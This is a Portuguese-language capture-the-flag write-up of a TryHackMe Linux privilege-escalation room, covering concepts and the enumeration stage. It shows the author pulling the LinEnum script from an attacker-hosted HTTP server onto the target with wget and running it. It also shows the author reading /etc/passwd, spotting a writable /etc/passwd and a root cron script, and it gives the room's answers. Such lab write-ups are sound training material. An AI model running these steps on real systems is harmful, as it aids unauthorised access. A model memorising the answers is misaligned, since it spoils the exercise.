# Introdução

A room trata de técnicas comuns de elevação de privilégios em ambientes com sistema operacional baseado em Linux.
# Execução

## 1 - Ger Connected

Nesse item, apenas deve-se iniciar a VM alvo.

Não há necessidade de responder nenhuma questão.

## 2 - Understanding Privesc

O que siginifica Elevação de Privilégios (Privilege Escalation)?

De forma objetiva, é uma forma de passar de uma permissão adquirida (em uma exploração) inicialmente mais básica para um nível de permissão mais alta.

Dificilmente em um CTF ou pentest no mundo real, consegue-se obter um acesso na exploração que já tenha uma permissão de aministrador. Por isso, é importante conhecer técnicas para elevar privilégios.

Com a elevação de privilégios efetivada em um alvo, pode-se:
- Reset de senhas;
- Bypass em controles de acesso para comprometer dados protegidos;
- Editar configurações de softwares;
- Habilitar persistência de acesso, permitindo retornar ao alvo posteriormente;
- Alterar privilégios de usuários;
- Poder utilizar outros comandos que apenas o superusuário pode usar.

Neste item não necessidade de responder nenhuma questão.

## 3 - Direction of Privilege Escalation

Árvore de elevação de privilégios:
![privilege tree](images/privilege_tree.png)

Existem duas variantes principais de elevação de privilégios:

- Elevação de privilégios horizontal: é quando consegue-se mudar para outro usuário com nível de permissão similar ao usuário inicial comprometido. Há possibilidade do novo usuário possuir alguma permissão que permita elevar para um superusuário, como por exemplo, alguma permissão de SUID.

- Elevação de privilégios vertical: é quando consegue-se mudar para um usuário com mais privilégios ou mesmo um superusuário.

Neste item não há necessidade de responder questões.

## 4 - Enumeration

Enumeration ou enumeração é uma forma de listar (enumerar) possíveis fraquezas no host alvo explorado. Essa enumeração pode ser realizada manualmente com alguns comandos do próprio S.O., mas existem scripts e ferramentas que nos auxiliam nessa tarefa. 

Um script bash bastante conhecido e útil é o [LinEnum](https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh).

Algumas vezes o host alvo não possui acesso à internet, o que dificulta obter o script. Para contornar isso, existem outras formas. Uma forma é realizar o download do LinEnum na máquina do atacante, subir um serviço http e no host alvo realizar o download via comando curl ou mesmo wget.

### Enviando o LinEnum para host alvo:

1. Realize o download no host atacante com o comando wget:

```shell
┌──(root㉿kali)-[/tryhackme/rooms/commonlinuxprivesc]
└─# wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
--2022-07-10 10:49:23--  https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.109.133, 185.199.108.133, 185.199.111.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.109.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 46631 (46K) [text/plain]
Saving to: ‘LinEnum.sh’

LinEnum.sh           100%[===================>]  45.54K  --.-KB/s    in 0.04s   

2022-07-10 10:49:23 (1.10 MB/s) - ‘LinEnum.sh’ saved [46631/46631]

```
2. Inicie um http server usando python no diretório que se baixou o LinEnum.sh:

```shell
python3 -m http.server 8000
```
Com o comando acima, iniciou-se um server http na porta 8000.

3. Realize o download no host alvo do script LinEnum.sh com o comando:

```shell
user3@polobox:~$ wget http://10.8.95.233:8000/LinEnum.sh
```
O ip informado acima é o ip do host atacante, no qual está executando um http server na porta 8000. Saída do comando abaixo:

```shell
user3@polobox:~$ wget http://10.8.95.233:8000/LinEnum.sh
--2022-07-10 10:43:10--  http://10.8.95.233:8000/LinEnum.sh
Connecting to 10.8.95.233:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 646573 (631K) [text/x-sh]
Saving to: ‘LinEnum.sh’

LinEnum.sh           100%[===================>] 631.42K   209KB/s    in 3.0s    

2022-07-10 10:43:14 (209 KB/s) - ‘LinEnum.sh’ saved [646573/646573]

```

Deve-se adicionar permissão de execução no arquivo com:

```shell
user3@polobox:~$ chmod +x LinEnum.sh 
```
Para executar:

```shell
user3@polobox:~$ ./LinEnum.sh 
```

Após a execução, serão exibidas em tela uma série de informações que podem servir de ponto de partida para elevação de privilégios.

A saída do script é organizada por seções. Algumas informações importantes são versão do kernel, arquivos sensíveis/importantes com permissão de leitura e escrita, arquivos com SUID (Set owner User ID up on execution), crontab, etc.

Essas informações podem auxiliar a na elevação de privilégios.

### Questões:

- a. A primeira questão é apenas realizar uma verificação inicial no host alvo. Não há necessidade de responder nada.

- b. ***What is the target's hostname?***: *polobox*

- c. ***Look at the output of /etc/passwd how many "user[x]" are there on the system?***: *8*

Para responder a questão ***c***, basta executar:

```shell
user3@polobox:~$ cat /etc/passwd | grep user

hplip:x:113:7:HPLIP system user,,,:/var/run/hplip:/bin/false
user1:x:1000:1000:user1,,,:/home/user1:/bin/bash
user2:x:1001:1001:user2,,,:/home/user2:/bin/bash
user3:x:1002:1002:user3,,,:/home/user3:/bin/bash
user4:x:1003:1003:user4,,,:/home/user4:/bin/bash
user5:x:1004:1004:user5,,,:/home/user5:/bin/bash
user6:x:1005:1005:user6,,,:/home/user6:/bin/bash
user7:x:1006:0:user7,,,:/home/user7:/bin/bash
user8:x:1007:1007:user8,,,:/home/user8:/bin/bash
```

- d. ***How many available shells are there on the system?***: *4*

Para responder a questão ***d***, basta procurar na saída do script LinEnum.sh na seção Available Shells:

```shell
[-] Available shells:
# /etc/shells: valid login shells
/bin/sh
/bin/dash
/bin/bash
/bin/rbash
```

- e. ***What is the name of the bash script that is set to run every 5 minutes by cron?***: *autoscript.sh*

Para responder a questão ***e***, basta procurar na saída da execução do LinEnum.sh pela linha:

```shell
# m h dom mon dow user  command
*/5  *    * * * root    /home/user4/Desktop/autoscript.sh
```

- f. ***What critical file has had its permissions changed to allow some users to write to it?***: */etc/passwd*

Para responder a questão ***f***, localize na saída da execução do LinEnum.sh o seguinte trecho:

```shell
[-] Can we read/write sensitive files:
-rw-rw-r-- 1 root root 2694 Mar  6  2020 /etc/passwd
-rw-r--r-- 1 root root 1087 Jun  5  2019 /etc/group
-rw-r--r-- 1 root root 581 Apr 22  2016 /etc/profile
-rw-r----- 1 root shadow 2359 Mar  6  2020 /etc/shadow
```
- g. ***Well done! Bear the results of the enumeration stage in mind as we continue to exploit the system!***: *Não há necessidade de resposta*